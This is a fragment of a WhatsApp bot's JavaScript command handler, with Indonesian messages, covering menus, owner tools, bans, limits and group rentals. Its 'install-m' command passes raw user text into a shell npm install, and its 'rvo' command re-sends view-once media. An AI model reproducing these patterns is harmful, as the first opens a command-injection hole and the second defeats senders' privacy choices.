case "menumenfess": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuconfess);
        else if (menuVersion === 'v2') menuV2(menuconfess);
        else if (menuVersion === 'v3') menuV3(menuconfess);
        else menuV1(menuconfess);

    } catch (error) {
        console.error('Error in menumenfess case:', error);
        menuV1(menuconfess);
    }
    break;
}

case "menurandom": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menurandom);
        else if (menuVersion === 'v2') menuV2(menurandom);
        else if (menuVersion === 'v3') menuV3(menurandom);
        else menuV1(menurandom);

    } catch (error) {
        console.error('Error in menurandom case:', error);
        menuV1(menurandom);
    }
    break;
}

case "menuberita": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuberita);
        else if (menuVersion === 'v2') menuV2(menuberita);
        else if (menuVersion === 'v3') menuV3(menuberita);
        else menuV1(menuberita);

    } catch (error) {
        console.error('Error in menuberita case:', error);
        menuV1(menuberita);
    }
    break;
}

case "menuppob": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuppob);
        else if (menuVersion === 'v2') menuV2(menuppob);
        else if (menuVersion === 'v3') menuV3(menuppob);
        else menuV1(menuppob);

    } catch (error) {
        console.error('Error in menuppob case:', error);
        menuV1(menuppob);
    }
    break;
}

case "menupremium": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menupremium);
        else if (menuVersion === 'v2') menuV2(menupremium);
        else if (menuVersion === 'v3') menuV3(menupremium);
        else menuV1(menupremium);

    } catch (error) {
        console.error('Error in menupremium case:', error);
        menuV1(menupremium);
    }
    break;
}

case "menulinode": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menulinode);
        else if (menuVersion === 'v2') menuV2(menulinode);
        else if (menuVersion === 'v3') menuV3(menulinode);
        else menuV1(menulinode);

    } catch (error) {
        console.error('Error in menulinode case:', error);
        menuV1(menulinode);
    }
    break;
}

case "menunsfw": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menunsfw);
        else if (menuVersion === 'v2') menuV2(menunsfw);
        else if (menuVersion === 'v3') menuV3(menunsfw);
        else menuV1(menunsfw);

    } catch (error) {
        console.error('Error in menunsfw case:', error);
        menuV1(menunsfw);
    }
    break;
}

case "menugenshin": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menugenshin);
        else if (menuVersion === 'v2') menuV2(menugenshin);
        else if (menuVersion === 'v3') menuV3(menugenshin);
        else menuV1(menugenshin);

    } catch (error) {
        console.error('Error in menugenshin case:', error);
        menuV1(menugenshin);
    }
    break;
}

case "menuenc": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuenc);
        else if (menuVersion === 'v2') menuV2(menuenc);
        else if (menuVersion === 'v3') menuV3(menuenc);
        else menuV1(menuenc);

    } catch (error) {
        console.error('Error in menuenc case:', error);
        menuV1(menuenc);
    }
    break;
}

case "menudigitalocean": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menudigitalocean);
        else if (menuVersion === 'v2') menuV2(menudigitalocean);
        else if (menuVersion === 'v3') menuV3(menudigitalocean);
        else menuV1(menudigitalocean);

    } catch (error) {
        console.error('Error in menudigitalocean case:', error);
        menuV1(menudigitalocean);
    }
    break;
}

case "menuislam": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuislam);
        else if (menuVersion === 'v2') menuV2(menuislam);
        else if (menuVersion === 'v3') menuV3(menuislam);
        else menuV1(menuislam);

    } catch (error) {
        console.error('Error in menuislam case:', error);
        menuV1(menuislam);
    }
    break;
}

case "menusearch": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menusearch);
        else if (menuVersion === 'v2') menuV2(menusearch);
        else if (menuVersion === 'v3') menuV3(menusearch);
        else menuV1(menusearch);

    } catch (error) {
        console.error('Error in menusearch case:', error);
        menuV1(menusearch);
    }
    break;
}
case "menubug": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menubug);
        else if (menuVersion === 'v2') menuV2(menubug);
        else if (menuVersion === 'v3') menuV3(menubug);
        else menuV1(menubug);

    } catch (error) {
        console.error('Error in menusearch case:', error);
        menuV1(menubug);
    }
    break;
}
case "menustalk": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menustalk);
        else if (menuVersion === 'v2') menuV2(menustalk);
        else if (menuVersion === 'v3') menuV3(menustalk);
        else menuV1(menustalk);

    } catch (error) {
        console.error('Error in menusearch case:', error);
        menuV1(menustalk);
    }
    break;
}
case "menuinstall": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuinstall);
        else if (menuVersion === 'v2') menuV2(menuinstall);
        else if (menuVersion === 'v3') menuV3(menuinstall);
        else menuV1(menuinstall);

    } catch (error) {
        console.error('Error in menusearch case:', error);
        menuV1(menuinstall);
    }
    break;
}
/*
         OWNER
*/
// PATH DATABASE
case 'req': {
    if (!text) return reply(`Masukkan request!\n\nContoh:\n${prefix}req Tambahkan menu downloader`);
    
    let db = loadReq();

    db.push({
        user: m.pushName || m.sender.split("@")[0],
        request: text
    });

    saveReq(db);

    reply(`✔️ Request berhasil disimpan!`);
}
break;


case 'listreq': {
    let db = loadReq();
    if (db.length === 0) return reply(`Belum ada request.`);
    
    let teks = `📌 *List Request User*\n\n`;
    db.forEach((x, i) => {
        teks += `${i+1}. *${x.user}*\n${x.request}\n\n`;
    });

    reply(teks);
}
break;


case 'delreq': {
    if (!text) return reply(`Masukkan nomor request!\nContoh: ${prefix}delreq 1`);
    
    let nomor = parseInt(text);
    let db = loadReq();

    if (isNaN(nomor) || nomor < 1 || nomor > db.length) {
        return reply(`Nomor tidak valid!`);
    }

    db.splice(nomor - 1, 1);
    saveReq(db);

    reply(`✔️ Request nomor ${nomor} berhasil dihapus!`);
}
break;
case "listdbuser":
case "listuserdb":
case "listuser": {
if (!isOwner) return m.reply(mess.owner)
    try {
        let users = global.db.users || {};

        let total = Object.keys(users).length;
        if (total === 0) return reply("*Tidak ada user yang terdaftar di database.*");

        let teks = `*📍 LIST USER TERDATA DI DATABASE*\n`;
        teks += `*Total:* ${total}\n\n`;

        let no = 1;
        for (let u in users) {
            teks += `${no++}. wa.me/${u.replace(/[^0-9]/g, '')}\n`;
        }

        reply(teks);

    } catch (e) {
        console.log(e);
        reply("Terjadi error saat mengambil list user.");
    }
}
break;
case "playch": {
if (!isOwner) return m.reply(mess.owner)
    try {
        if (!text.includes('|')) return reply(`Format:\n${cmd} idtujuan | judul lagu`);

        let tujuan = text.split("|")[0].trim();
        let query  = text.split("|")[1].trim();

        React("🎵");

        // YT Search
        let ytsSearch = await yts(query);
        let re = ytsSearch.all[0];
        if (!re) return reply("Tidak ditemukan!");

        // Download MP3
        let dl = await ytdl.ytmp3(re.url);
        let mp3Url = dl.download.url;
        let mp3 = await getBuffer(mp3Url);

        const fs = require("fs");
        const { exec } = require("child_process");
        const path = require("path");

        let input = path.join(__dirname, "in.mp3");
        let output = path.join(__dirname, "out.ogg");

        // Save MP3
        fs.writeFileSync(input, mp3);

        // Convert OGG OPUS (WhatsApp Compatible)
        await new Promise((resolve, reject) => {
            exec(
                `ffmpeg -y -i "${input}" -ac 1 -ar 48000 -b:a 48k -c:a libopus "${output}"`,
                (err) => err ? reject(err) : resolve()
            );
        });

        let ogg = fs.readFileSync(output);

        // SEND TO TARGET
        await sock.sendMessage(tujuan, {
            audio: ogg,
            mimetype: "audio/ogg; codecs=opus",
            ptt: true,
            contextInfo: {
                externalAdReply: {
                    title: re.title,
                    thumbnailUrl: re.thumbnail,
                    renderLargerThumbnail: true
                }
            }
        });

        reply(`✔️ PTT terkirim ke *${tujuan}*`);

        fs.unlinkSync(input);
        fs.unlinkSync(output);

    } catch (e) {
        console.log(e);
        reply("❌ Error saat membuat PTT!");
    }
}
break;
case 'addsaldo': {

  if (!isOwner) return m.reply('❌ Perintah ini hanya bisa digunakan oleh *Owner*!');

  if (!text) return m.reply(`⚠️ Format salah!\n\nGunakan:\n.addsaldo @tag|nomor jumlah\n\nContoh:\n.addsaldo @user 1000`);

  let target;
  let jumlah;

  // ==========================
  // Parsing input
  // ==========================
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    target = m.mentionedJid[0];
    jumlah = text.replace(/@.+?|\s/g, '') || null;
  } else {
    const parts = text.split(' ');
    if (parts.length < 2) 
      return m.reply(`⚠️ Format salah!\n\n.addsaldo nomor jumlah`);

    target = parts[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    jumlah = parts[1];
  }

  // ==========================
  // Validasi
  // ==========================
  if (!target) return m.reply('❌ Target tidak ditemukan!');
  if (!global.db.users[target]) return m.reply('❌ User belum ada di database!');

  jumlah = parseInt(jumlah);
  if (isNaN(jumlah) || jumlah <= 0) return m.reply('❌ Jumlah harus berupa angka dan lebih dari 0!');

  // ==========================
  // Proses tambah saldo
  // ==========================
  global.db.users[target].money += jumlah;

  let nama = global.db.users[target].name || target.split('@')[0];

  m.reply(
`✅ *Saldo Ditambahkan!*

👤 User: *${nama}*
💰 Tambahan: *${jumlah}*
📦 Total sekarang: *${global.db.users[target].money}*`
  );

}
break;
case 'autobackup':
case 'setautobackup': {
    if (!isOwner) return m.reply("Owner only!");

    if (text === "on") {
        global.autoBackup = true;
        m.reply("Auto-backup diaktifkan.");
    } else if (text === "off") {
        global.autoBackup = false;
        m.reply("Auto-backup dimatikan.");
    } else {
        m.reply("Gunakan: setautobackup on/off");
    }
}
break;
case 'install-m': {
   if (!isOwner) return reply("⚠️ Fitur ini khusus Owner!");
   if (!args[0]) return reply("⚠️ Masukkan nama module!\n\nContoh: .install-m axios");

   const moduleName = args[0];
   reply(`⏳ Sedang menginstall module *${moduleName}* ...`);

   const { exec } = require('child_process');
   exec(`npm install ${moduleName}`, (error, stdout, stderr) => {
      if (error) {
         reply(`❌ Gagal install module:\n${error.message}`);
         return;
      }
      if (stderr) {
         reply(`⚠️ Ada peringatan:\n${stderr}`);
      }
      reply(`✅ Module *${moduleName}* berhasil diinstall!\n\n${stdout}`);
   });
   break;
}
case 'ban': {
  // cek apakah yang menjalankan owner
  if (!isOwner) return m.reply('Perintah ini hanya untuk owner.');

  // target user: prioritas mention > quoted > nomor di text
  let targetJid = null;
  if (m.mentionedJid && m.mentionedJid.length) {
    targetJid = m.mentionedJid[0];
  } else if (m.quoted && m.quoted.sender) {
    targetJid = m.quoted.sender;
  } else if (text && text.match(/\d{6,}/)) {
    // ambil angka (nomor) lalu tambahkan domain wa
    const number = text.replace(/[^0-9]/g, '');
    targetJid = number ? (number + '@s.whatsapp.net') : null;
  }

  if (!targetJid) return m.reply('Mohon tag/quote user atau kirim nomor. Contoh: .ban @user atau .ban 62812xxx');

  // jangan ban owner sendiri
  if (owner && Array.isArray(owner) && owner.includes(targetJid)) {
    return m.reply('Tidak bisa membanned owner.');
  }

  // jangan ban bot sendiri
  if (targetJid === botNumber) {
    return m.reply('Tidak bisa membanned bot.');
  }

  // cek sudah dibanned
  if (isBannedUser(targetJid)) {
    return m.reply('User tersebut sudah dibanned sebelumnya.');
  }

  const ok = addBannedUser(targetJid);
  if (ok) {
    m.reply(`Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
    // opsional: log ke owner / group admin
    try {
      if (sock && sock.sendMessage) {
        // contoh notifikasi ke owner
        if (owner && owner[0]) sock.sendMessage(owner[0], { text: `User dibanned: ${targetJid}\nBy: ${m.sender}` });
      }
    } catch (e) { /* ignore */ }
  } else {
    m.reply('Gagal menyimpan data banned. Cek permission file.');
  }
} break;

// --- optional: case "unban" untuk membuka ban ---
case 'unban': {
  if (!isOwner) return m.reply('Perintah ini hanya untuk owner.');

  let targetJid = null;
  if (m.mentionedJid && m.mentionedJid.length) {
    targetJid = m.mentionedJid[0];
  } else if (m.quoted && m.quoted.sender) {
    targetJid = m.quoted.sender;
  } else if (text && text.match(/\d{6,}/)) {
    const number = text.replace(/[^0-9]/g, '');
    targetJid = number ? (number + '@s.whatsapp.net') : null;
  }

  if (!targetJid) return m.reply('Mohon tag/quote user atau kirim nomor. Contoh: .unban @user atau .unban 62812xxx');

  if (!isBannedUser(targetJid)) {
    return m.reply('User tersebut tidak terdapat di daftar banned.');
  }

  const ok = removeBannedUser(targetJid);
  if (ok) {
    m.reply(`Sukses membuka ban: ${targetJid}`);
  } else {
    m.reply('Gagal menghapus dari daftar banned. Cek permission file.');
  }
} break;
case 'addlimit': {
  // Cek apakah pengguna adalah owner/admin
  if (!isOwner) {
    return m.reply('❌ *PERINTAH KHUSUS OWNER*\nHanya owner yang dapat menambah limit user!')
  }
  
  // Parse argument: .addlimit @user jumlah | .addlimit 628xxx jumlah
  let [target, amount] = text.split(' ')
  
  if (!target || !amount) {
    return m.reply(`❌ *FORMAT SALAH!*
    
📝 *Cara penggunaan:*
• .addlimit @user jumlah
• .addlimit 628xxx jumlah

📌 *Contoh:*
• .addlimit @user 50
• .addlimit 6281234567890 25`)
  }
  
  // Parse jumlah limit
  amount = parseInt(amount)
  if (isNaN(amount) || amount <= 0) {
    return m.reply('❌ Jumlah limit harus angka positif!')
  }
  
  // Cari target user
  let userTarget
  if (target.startsWith('@')) {
    // Jika mention @user
    const mentioned = m.mentionedJid[0]
    if (!mentioned) {
      return m.reply('❌ Tag user yang valid!')
    }
    userTarget = mentioned
  } else if (target.startsWith('628')) {
    // Jika input nomor langsung
    userTarget = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  } else {
    return m.reply('❌ Format target tidak valid! Gunakan @user atau nomor 628xxx')
  }
  
  // Pastikan user ada di database
  if (!global.db.users[userTarget]) {
    global.db.users[userTarget] = {
      limit: 0,
      freelimit: 0,
      money: 0,
      // ... properti default lainnya
    }
  }
  
  const user = global.db.users[userTarget]
  
  // Tambah limit
  user.limit = (user.limit || 0) + amount
  
  // Dapatkan info user
  const userInfo = await sock.fetchStatus(userTarget).catch(() => ({ status: 'Unknown' }))
  const userName = user.nama || user.name || 'User'
  
  m.reply(`✅ *BERHASIL MENAMBAH LIMIT*

👤 *User:* ${userName}
📞 *Nomor:* ${userTarget.split('@')[0]}
➕ *Limit ditambah:* ${amount}
📊 *Limit sekarang:* ${user.limit}

⚡ *Ditambahkan oleh:* ${pushname}`)
}
break
case "listsewa": {

if (!isOwner) return m.reply("Hanya owner yang bisa menggunakan command ini!");

try {
    if (!fs.existsSync('./lib/database/sewa.json')) {
        return m.reply("📭 Tidak ada data sewa");
    }
    
    const data = fs.readFileSync('./lib/database/sewa.json', 'utf8');
    const sewaData = JSON.parse(data);
    const activeSewa = sewaData.filter(item => item.status === 'active');
    
    if (activeSewa.length === 0) {
        return m.reply("📭 Tidak ada sewa aktif");
    }
    
    let message = `📋 DAFTAR SEWA AKTIF\n\n`;
    
    activeSewa.forEach((sewa, index) => {
        const sisaWaktu = sewa.endTime - Date.now();
        const hari = Math.floor(sisaWaktu / (1000 * 60 * 60 * 24));
        const jam = Math.floor((sisaWaktu % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        
        message += `${index + 1}. Group: ${sewa.groupId}\n`;
        message += `   ⏰ Sisa: ${hari} hari ${jam} jam\n`;
        message += `   📅 Berakhir: ${new Date(sewa.endTime).toLocaleString()}\n\n`;
    });
    
    m.reply(message);
    
} catch (error) {
    m.reply("Error: " + error.message);
}
}
break;
// Fungsi menghitung detik
function calculateSeconds(jumlah, unit) {
    switch(unit) {
        case 's': return jumlah;
        case 'm': return jumlah * 60;
        case 'h': return jumlah * 60 * 60;
        case 'd': return jumlah * 60 * 60 * 24;
        default: return jumlah;
    }
}

// Fungsi ekstrak group ID dari link
async function extractGroupId(link) {
    try {
        const regex = /https:\/\/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/;
        const match = link.match(regex);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

// Fungsi simpan data sewa
async function saveSewaData(groupId, totalDetik) {
    const sewaData = {
        groupId: groupId,
        startTime: Date.now(),
        endTime: Date.now() + (totalDetik * 1000),
        status: 'active'
    };
    
    // Baca data existing
    let existingData = [];
    try {
        if (fs.existsSync('./lib/database/sewa.json')) {
            const data = fs.readFileSync('./lib/database/sewa.json', 'utf8');
            existingData = JSON.parse(data);
        }
    } catch (error) {
        existingData = [];
    }
    
    // Hapus data lama untuk group yang sama
    const filteredData = existingData.filter(item => item.groupId !== groupId);
    
    // Tambah data baru
    filteredData.push(sewaData);
    
    // Simpan ke file
    fs.writeFileSync('./lib/database/sewa.json', JSON.stringify(filteredData, null, 2));
}
case "addsewa": {

if (!isOwner) return m.reply("Hanya owner yang bisa menggunakan command ini!");
if (!text) return m.reply("Contoh: .addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d");

try {
    const [link, waktu] = text.split("|").map(item => item.trim());
    if (!link || !waktu) return m.reply("Format salah! Contoh: .addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d");
    
    // Validasi format waktu
    const waktuRegex = /^(\d+)(s|m|h|d)$/;
    if (!waktuRegex.test(waktu)) {
        return m.reply("Format waktu salah! Gunakan: 30s (detik), 30m (menit), 30h (jam), 30d (hari)");
    }
    
    const [, jumlah, unit] = waktu.match(waktuRegex);
    const totalDetik = calculateSeconds(parseInt(jumlah), unit);
    
    // Ekstrak group ID dari link
    const groupId = await extractGroupId(link);
    if (!groupId) return m.reply("Link group tidak valid!");
    
    // Simpan data sewa
    await saveSewaData(groupId, totalDetik);
    
    // Join ke group
    await sock.groupAcceptInvite(groupId);
    
    m.reply(`✅ Berhasil menambah sewa group!\n📅 Durasi: ${jumlah}${unit}\n⏰ Berakhir: ${new Date(Date.now() + totalDetik * 1000).toLocaleString()}`);
    
} catch (error) {
    console.error(error);
    m.reply("Terjadi error saat menambah sewa: " + error.message);
}
}
break;
case 'sendchat': {

if (!isOwner) return reply(mess.owner)
  if (!text) return m.reply(`Contoh: ${cmd} Hai | id |https://`)
  let [l, r, p] = text.split`|`
if (!l) l = ''
if (!r) r = ''
if (!p) p = ''
  let teks = `${l}`

  // ID Owner Bot (bisa lebih dari satu)
  const ownerJid = [`${r}`] // ganti dengan nomor owner

  for (let id of ownerJid) {
    await sock.sendMessage(id, {
    interactiveMessage: {
      title: teks,
      footer: namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: namaBot,
            button_title: namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "source",
          url: p,
          merchant_url: p
})
          }
        ]
      }
    }
  },
  { quoted: fakeQuoted });
  }


  m.reply('Berhasil mengirim pesan')
}
break
case 'join':
    case 'joingc': {

if (!isOwner) return reply(mess.owner);
      if (!text) return m.reply(`Contoh: ${cmd} linkgc`)
      sock.sendMessage(m.chat, {
        text: 'Sukses join ke grup.'
      }, {
        quoted: fakeQuoted
      })
      const groupId = await extractGroupId(text);
    if (!groupId) return m.reply("Link group tidak valid!");
      await sock.groupAcceptInvite(groupId);
    }
    break
    case "addowner":
case "addown": {

    if (!isOwner) return reply(mess.owner)
    if (!m.quoted && !text) return m.reply("Contoh: .addowner 6285xxxx")

    // AMBIL RAW NUMBER
    let raw = m.quoted 
        ? m.quoted.sender.split("@")[0] 
        : text

    // BERSIHKAN SEMUA NON-DIGIT
    let number = raw.replace(/\D/g, "")  // hanya angka

    // KHUSUS NOMOR INDONESIA
    if (number.startsWith("0")) {
        number = "62" + number.slice(1)
    }

    // Jika nomor lain (misal Austria +43), biarkan apa adanya
    // contoh: "43xxxxxx"

    // CEK VALID
    if (number.length < 6) return reply("Nomor tidak valid!")

    const jid = number + "@s.whatsapp.net"

    // CEK OWNER SUDAH ADA
    if (owner.includes(jid)) return reply(`Nomor ${number} sudah menjadi owner!`)
    if (jid === botNumber) return reply(`Tidak bisa menambahkan bot sebagai owner!`)

    // SIMPAN
    owner.push(jid)
    fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))

    reply(`Owner berhasil ditambah: ${number} ✅`)
}
break
case "listowner": case "listown": {

if (owner.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owner) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: fakeQuoted})
}
break
case "delowner": case "delown": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owner.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owner.indexOf(input)
await owner.splice(posi, 1)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break
case 'delppbot': {

if (!isOwner) return reply(mess.owner)
await sock.removeProfilePicture(sock.user.id)
reply(`Berhasil Menghapus Gambar Profil Bot`)
}
break
case 'setbotpp':
    case 'setppbot': {

if (!isOwner) return relply(mess.owner)
      if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (/webp/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      let media = await sock.downloadAndSaveMediaMessage(quoted)
      await sock.updateProfilePicture(botNumber, {
        url: media
      }).then(() => fs.unlinkSync(media)).catch((err) => fs.unlinkSync(media))
      m.reply('Sukses mengganti pp bot!')
    }
    break
case "tojs": case "q": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break 
case "rvo": case "readviewonce": {
 if (!isOwner) return reply(mess.owner);
if (!m.quoted) return reply("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: fakeQuoted})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: fakeQuoted})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: fakeQuoted})
    } 
}
break
case "listprem": {

if (!isOwner) return reply(mess.owner)
if (premium.length < 1) return reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: fakeQuoted})
}
break
case "addprem": {

if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘗𝘳𝘦𝘮𝘪𝘶𝘮!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
const user = global.db.users[input]
user.limit = (user.limit || 0) + 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
}
break
case "delprem": {
    if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
const cukupLimit = await useLimit(input, 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999);
}
break
case "self": case "public": {
   if (!isOwner) return m.reply(mess.owner)
   let status = true
   if (command == "self") status = false
   sock.public = status
   fs.writeFileSync("./setdb.json", JSON.stringify({ public: status }, null, 2))
   return m.reply(`Berhasil mengganti ke mode *${command}*`)
}
break
case "rst": case "restart": {

if (!isOwner) return m.reply(mess.owner)
function restartServer() {
const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });
  process.exit(0);
}
await m.reply("*Restarting*")
await setTimeout(() => {
restartServer();
}, 4500)
}
break
case "mode": {
   m.reply(`🤖 Bot Mode: ${sock.public ? "Public" : "Self"}`)
}
break
case "setnamabot":
            case "setbotname":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana namanya?\nContoh: ${cmd} Lyrra`);
 }
 await sock.updateProfileName(text);
 reply(`Success in changing the name of bot's number`);
 }
 break;
 case "setbiobot":
 case "setbotbio":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana teksnya?\nContoh: ${cmd} Lyrra`);
 }
 await sock.updateProfileStatus(text);
 reply(`Success in changing the bio of bot's number`);
 }
 break;

case "creategc":
 case "creategroup":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!args.join(" ")) {
 return reply(`Use ${cmd} groupname`);
 }
 try {
 let cret = await sock.groupCreate(args.join(" "), []);
 let response = await sock.groupInviteCode(cret.id);
 teks = ` 「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
 `;
 sock.sendMessage(m.chat, {
 text: teks,
 mentions: await sock.parseMention(teks)
 }, {
 quoted: fakeQuoted
 });
 } catch {
 reply("yah Error kak laporankan ke owner agar di perbaiki");
 }
 }
 break;
 case "getcase": { 
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
        let hasil = Case.get(text);
        m.reply(hasil)
}
break;

case "addcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(`case "namacase":{ ... }`)
    try {
        Case.add(text);
        reply("✅ Case berhasil ditambahkan.");
    } catch (e) {
        reply(e.message);
    }
}
break;

case "delcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
    try {
        Case.delete(text);
        reply(`✅ Case "${text}" berhasil dihapus.`);
    } catch (e) {
        reply(e.message);
    }
}
break;

case "listcase": {
    if (!isOwner) return reply(mess.owner);
    try {
        reply("📜 List Case:\n\n" + Case.list());
    } catch (e) {
        reply(e.message);
    }
}
break;
case 'onlypc': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlypm) return m.reply('Sudah diaktifkan sebelumnya')
        setting.onlypm = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlypm) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.onlypm = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
